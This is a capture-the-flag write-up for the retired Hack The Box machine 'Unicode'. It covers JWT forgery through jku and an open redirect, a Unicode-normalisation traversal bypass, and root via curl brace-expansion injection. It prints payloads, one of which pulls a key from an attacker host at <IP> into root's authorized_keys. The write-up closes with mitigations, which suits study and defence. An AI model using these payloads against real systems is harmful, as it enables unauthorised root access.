---
machine: Unicode
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jwt, jku, open-redirect, traversal, pyinstaller, privesc]
---

# Unicode — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The panel uses RS256 JWTs and trusts the `jku` header. An open redirect at `/redirect/?url=` combined with `static/../redirect` lets us serve our own `jwks.json` and forge an administrator token. The panel has an LFI at `display/?page=` that blocks `../`, but `U+2025` normalises to `..` and reads `app.py` and `db.yaml`. `code`'s credentials lead to a PyInstaller binary run with sudo, vulnerable to curl argument injection through brace expansion.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH and `80` nginx with uWSGI/Flask.
- `hackmedia.htb` offers login, a dashboard and `/redirect`.
- The JWT includes `jku: http://hackmedia.htb/static/jwks.json`.

## Enumeration

Decode the JWT and confirm the signature is checked against the key published at `jku`. Pointing `jku` at our host fails; the server requires it to start with `hackmedia.htb/static`. The open redirect allows chaining `http://hackmedia.htb/static/../redirect/?url=<IP>/jwks.json`.

## Foothold

Generate an RSA pair, publish `jwks.json` and sign a token with `user=admin`. The resulting cookie opens the dashboard. The app exposes `display/?page=`; the filter blocks `../`, but `U+2025` (`‥`) is normalised to `..` afterwards and reads `app.py` and `db.yaml`.

```bash
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
```

## Lateral movement

`db.yaml` holds `code`'s credentials, which work over SSH. The home directory contains `/usr/bin/treport`, a PyInstaller binary run with sudo.

## Privilege escalation

`treport` creates, reads and downloads reports. The download option builds `/bin/bash -c "curl <input> -o /root/reports/..."` and filters spaces, `;`, `|` and words such as `file`. Bash brace expansion bypasses the filter: `{http://<IP>/x,-o,/root/.ssh/authorized_keys}` expands into two arguments and writes the key for root. `{fiLe:///root/root.txt,-o-}` reads the flag.

```bash
sudo /usr/bin/treport
# option 3: {http://<IP>/authorized_keys,-o,/root/.ssh/authorized_keys}
```

## Evidence

- JWT with our own `jku` accepted after the open redirect.
- `app.py` and `db.yaml` read with `U+2025`.
- `treport` identified as PyInstaller.
- Brace expansion writing to `/root/.ssh/authorized_keys`.

## Lessons learned

- Prefix validation of `jku` fails when the prefix contains an open redirect.
- Traversal filters must run after Unicode normalisation.
- PyInstaller does not protect code; it can be extracted and decompiled.
- Character filters do not cover Bash brace expansion.

## Mitigation and detection

- Pin the allowed keys and never accept `jku` from the token.
- Normalise to NFKC before validating paths and use allowlists.
- Avoid `bash -c` with user input; use `execve` with arguments.
- Audit `treport` executions and writes to root's SSH keys.

## References

- [0xdf — Unicode](https://0xdf.gitlab.io/2022/05/07/htb-unicode.html)
- [IppSec — Unicode](https://www.youtube.com/watch?v=2mH6Ri7EAq0)
- [Hack The Box — Unicode](https://app.hackthebox.com/machines/unicode)
